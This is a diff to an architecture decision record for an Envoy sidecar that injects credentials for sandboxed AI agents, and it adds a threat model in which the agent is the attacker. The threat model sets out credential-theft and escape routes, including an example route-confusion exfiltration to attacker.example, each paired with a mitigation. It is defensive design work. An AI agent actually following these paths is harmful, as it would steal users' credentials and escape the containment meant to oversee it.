@@ -37,7 +37,7 @@ The decisive reason for sidecar over a shared namespace-level Envoy is **identit
 
 ### Credential injection
 
-Envoy route table matches on `host` + `:path` prefix (ADR-028's `hostPattern` / `pathPattern`). Per-route `typed_per_filter_config` selects a `credential_injector` config with `header_name` and `header_prefix` (ADR-028's `injectionConfig`). Secrets come from Kubernetes Secrets. **Each Secret is owner-scoped, not instance-scoped** — one `Secret` per `(owner, connection)` (e.g. `connection-github` for user X), shared by every present and future agent instance that owner authorizes to use the connection. No PostgreSQL.
+Envoy route table matches on **the resolved upstream cluster + SNI**, not the agent-supplied `Host:` header (ADR-028's `hostPattern` / `pathPattern` configures the cluster mapping, but the credentialed-route match is bound to the resolved destination — see Threat Model on route-confusion exfiltration). Per-route `typed_per_filter_config` selects a `credential_injector` config with `header_name` and `header_prefix` (ADR-028's `injectionConfig`). Secrets come from Kubernetes Secrets. **Each Secret is owner-scoped, not instance-scoped** — one `Secret` per `(owner, connection)` (e.g. `connection-github` for user X), shared by every present and future agent instance that owner authorizes to use the connection. No PostgreSQL.
 
 **Secret access is restricted to the sidecar container — the agent container must never have it.** The agent runs untrusted code (Claude Code / Codex / etc., plus everything the model decides to run); if the pod's ServiceAccount could read Secrets via the K8s API, the agent could enumerate them and the whole MITM model collapses. Two layered restrictions:
 
@@ -99,6 +99,30 @@ ADR-015's caller-to-OneCLI auth machinery (Keycloak RFC 8693 token exchange for 
 **Use ANTHROPIC_BASE_URL / HTTP_PROXY without TLS interception.** The secure-deployment doc notes that `ANTHROPIC_BASE_URL` lets a proxy inspect plaintext sampling traffic without MITM, and that `HTTP_PROXY` alone (without a trusted CA) only gives the proxy opaque CONNECT tunnels. Rejected as the general solution: we need credential injection for arbitrary upstream services (GitHub, Slack, internal gateways per ADR-028), not only the Claude API. However, this *is* the right shape for sampling-only deployments and the Envoy config can degrade to it cleanly.
 
 **Namespace-shared Envoy Deployment instead of a sidecar.** Attractive on paper: one data-plane component, smaller resource footprint, simpler Helm topology. Rejected because identity-by-source-IP is the only signal a shared Envoy gets, and using it requires a pod-IP-to-instance resolver in the request path with a race window every time Kubernetes reuses an IP after a pod restart. The SPIFFE-style mTLS workaround (each agent presents an instance-scoped client cert) is heavier operationally than just running a sidecar, and still requires an identity issuer per instance. The shared-Envoy footprint advantage is also smaller than it looks: one idle Envoy is ~30–50 MB RSS, modest against the agent process itself.
+
+## Threat Model
+
+The threat actor here is the **agent process itself**. Agents run arbitrary code — generated, downloaded, or prompted — and must be assumed compromisable on every request. The whole point of the credential-gateway pattern is that compromising the agent does not compromise the credentials. Maintaining that property requires every path from the agent container to the secret bytes to be closed; sidecar-only volume mounts are necessary but not sufficient. The full set:
+
+**Envoy admin interface.** Containers in a pod share the network namespace, so anything bound on the sidecar's localhost is reachable from the agent. Envoy's admin endpoint exposes `/config_dump`, `/clusters`, and (depending on version/config) endpoints whose responses include SDS material. Disable the admin interface, or bind it to a Unix socket the agent has no path to. This is the easiest accidental compromise.
+
+**Route confusion exfiltration.** The agent does not need to read the secret — it can trick Envoy into injecting the secret into a request to an attacker-controlled upstream. A route table that matches on `Host:` header alone is sufficient: the agent issues `CONNECT attacker.example:443` with a manipulated `Host: api.github.com`, and the credential injects toward the attacker. Mitigations:
+
+- Pin each credentialed route to an explicit upstream cluster.
+- Match on resolved upstream / SNI, not the agent-supplied `Host:` header.
+- If `dynamic_forward_proxy` is used on credentialed routes, gate it with a strict DNS allowlist.
+
+**Kubernetes API via SA token.** If the agent container's auto-mounted ServiceAccount token has `get secrets` RBAC, the agent reads the Secret directly from the API regardless of volumeMount scoping. Set `automountServiceAccountToken: false` on the agent container, and grant the pod's SA no `get secrets` permission at all — kubelet projects the secret volume into the sidecar without needing API access.
+
+**Container escape to kubelet volume directory.** The K8s Secret is materialized on the host under `/var/lib/kubelet/pods/<uid>/volumes/`. A container escape from the agent reaches it directly, bypassing every volumeMount-scoping argument. **gVisor at the pod level is the load-bearing mitigation**, with seccomp-strict / read-only-rootfs / no-privileged / dropped-caps as defense in depth. Without sandboxing, this is the path that defeats every other defense. Operationally this means the cluster must provide a `RuntimeClass` (gVisor `runsc`, Kata Containers, or equivalent) and the Controller must render every agent pod with that runtimeClass. The k3s-on-lima dev cluster needs the runtime installed and registered; managed-K8s deployments inherit the cloud's offering (GKE Sandbox, etc.).
+
+**Envoy proxy data-path exploit.** The agent has network reach to the sidecar's listeners — that's the proxy interface itself. A parsing vulnerability (HTTP/2, h2c, QUIC) turns that into RCE inside the sidecar, at which point all SDS-loaded secrets are in-process. Track Envoy releases on a CVE timer, minimize the enabled filter set, rely on the gVisor sandbox as defense in depth.
+
+**Shared PID namespace.** Kubernetes pods share network and IPC namespaces but not PID by default. `shareProcessNamespace: true` reverses that, exposing Envoy's process to the agent (`/proc/<pid>/mem` etc.). The Controller renderer must hard-code this to `false` and refuse to honor template overrides.
+
+**ext_authz fingerprint replay / collision.** The HITL design stores approval decisions keyed by `(instance, request fingerprint)`. If the fingerprint is fully controllable by the agent — raw URL plus body — the agent can replay a stored approval against a different effective destination, or fingerprint-collide a sensitive request with a previously-approved benign one. The fingerprint must be drawn from Envoy's *resolved* upstream + method + a stable subset of the path, not the raw request the agent supplied.
+
+The honest read of this list: the credential-gateway pattern is sound and Envoy is a strong implementation choice, but isolation is a property of the *stack* — sidecar volumeMount + SA token closure + admin disabled + routes pinned + gVisor + seccomp + patched Envoy. Removing any one item materially erodes the guarantee. The Consequences section's "Operational simplification" line is true; this section makes the corresponding *security obligations* equally explicit so they're not absorbed silently into implementation work.
 
 ## Consequences
 
